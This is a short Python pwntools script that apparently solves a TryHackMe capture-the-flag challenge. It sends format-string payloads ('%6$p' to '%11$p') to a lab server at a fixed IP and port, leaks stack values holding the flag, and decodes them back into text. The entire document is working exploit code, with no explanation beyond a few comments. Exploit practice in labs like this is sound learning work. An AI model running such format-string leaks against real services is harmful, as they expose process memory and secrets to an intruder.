from pwn import *

elf = context.binary = ELF('./pwn106-user-1644300441063.pwn106-user', checksec=False)

flag_parts = []

# Flag pointers found in the stack between 6'th and 11'th arguments
for i in range(6, 12):
    io = remote('10.10.140.218', 9006)
    payload = f'%{i}$p'
    io.sendlineafter(b'Enter your THM username to participate in the giveaway: ', payload)
    io.recvuntil(b'Thanks ')
    response = io.recvline().strip() # Remove whitespaces and new lines
    response_no_0x = response[2:]

    responsed_unhexed = unhex(response_no_0x)

    response_big_endian = responsed_unhexed[::-1]
    print(f'{i}: {response_big_endian}')

    flag_parts.append(response_big_endian.decode())  # Decode bytes to string
    io.close()


full_flag = ''.join(flag_parts)
print(f"Full Flag: {full_flag}")
